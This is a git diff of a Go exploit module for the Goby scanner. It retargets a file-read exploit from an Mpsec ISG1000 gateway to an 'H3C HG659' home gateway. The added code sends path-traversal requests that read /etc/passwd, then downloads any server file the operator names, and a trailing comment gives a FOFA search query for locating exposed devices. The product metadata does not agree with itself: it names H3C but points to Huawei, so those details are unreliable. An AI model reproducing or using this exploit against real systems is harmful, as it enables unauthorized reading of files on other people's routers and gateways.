@@ -7,35 +7,23 @@ import (
 	"git.gobies.org/goby/goscanner/scanconfig"
 	"git.gobies.org/goby/httpclient"
 	"strings"
+	"regexp"
 )
 
 func init() {
 	expJson := `{
-  "Name": "Mpsec ISG1000 File read",
-  "Description": "There is an arbitrary file download vulnerability in Mpsec ISG1000 security gateway, through which attackers can obtain arbitrary files from the server",
-  "Product": "Mpsec ISG1000",
-  "Homepage": "https://www.maipu.com.cn",
-  "DisclosureDate": "2021-06-04",
+  "Name": "H3C HG659 lib File Read",
+  "Description": "H3C HG659 is any file read, can read any file server",
+  "Product": "H3C HG659",
+  "Homepage": "https://www.huawei.com/",
+  "DisclosureDate": "2021-06-15",
   "Author": "PeiQi",
-  "GobyQuery": "app=\"MAiPU-Gateway\"",
+  "GobyQuery": "app=\"HuaWei-Home-Gateway\"",
   "Level": "2",
-  "Impact": "<p>through which attackers can obtain arbitrary files from the server</p>",
-  "Recommendation": "Filter parameters",
+  "Impact": "<p>File read</p>",
+  "Recommendation": "Update",
   "References": [
-    "h",
-    "t",
-    "t",
-    "p",
-    ":",
-    "/",
-    "/",
-    "f",
-    "o",
-    "f",
-    "a",
-    ".",
-    "s",
-    "o"
+    "http://wiki.peiqi.tech"
   ],
   "HasExp": true,
   "ExpParams": [
@@ -45,10 +33,6 @@ func init() {
       "value": "/etc/passwd"
     }
   ],
-  "ExpTips": {
-    "Type": "",
-    "Content": ""
-  },
   "ScanSteps": [
     "AND"
   ],
@@ -60,14 +44,13 @@ func init() {
   "CVSSScore": "0.0",
   "AttackSurfaces": {
     "Application": [
-      "Mpsec ISG1000"
+      "H3C HG659"
     ],
     "Support": null,
     "Service": null,
     "System": null,
     "Hardware": null
   },
-  "Disable": false,
   "Recommandation": "<p>undefined</p>"
 }`
 
@@ -75,30 +58,36 @@ func init() {
 		goutils.GetFileName(),
 		expJson,
 		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
-			uri := "/webui/?g=sys_dia_data_down&file_name=../etc/passwd"
+		    uri := "/lib///....//....//....//....//....//....//....//....//etc//passwd"
 			cfg := httpclient.NewGetRequestConfig(uri)
 			cfg.VerifyTls = false
 			cfg.FollowRedirect = false
 			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
 			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
-				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "root")
-			}
+        		return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root:")
+        	}
 			return false
 		},
 		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
-			file := ss.Params["File"].(string)
-			uri := "/webui/?g=sys_dia_data_down&file_name=.." + file
+		    file := ss.Params["File"].(string)
+		    file = strings.Replace(file, "/", "//", -1)
+		    uri := "/lib///....//....//....//....//....//....//....//...." + file
 			cfg := httpclient.NewGetRequestConfig(uri)
 			cfg.VerifyTls = false
 			cfg.FollowRedirect = false
 			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
 			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
-				if resp.StatusCode == 200 {
-					expResult.Output = resp.Utf8Html
-					expResult.Success = true
-				}
-			}
+			    if resp.StatusCode == 200 {
+            		expResult.Output = resp.RawBody
+            		expResult.Success = true
+			    }
+        	}
 			return expResult
 		},
 	))
 }
+
+/* 
+FOFA 语句是 app="HUAWEI-Home-Gateway-HG659"  Goby扫出来的是 app="HuaWei-Home-Gateway" 
+用FOFA的语句
+*/
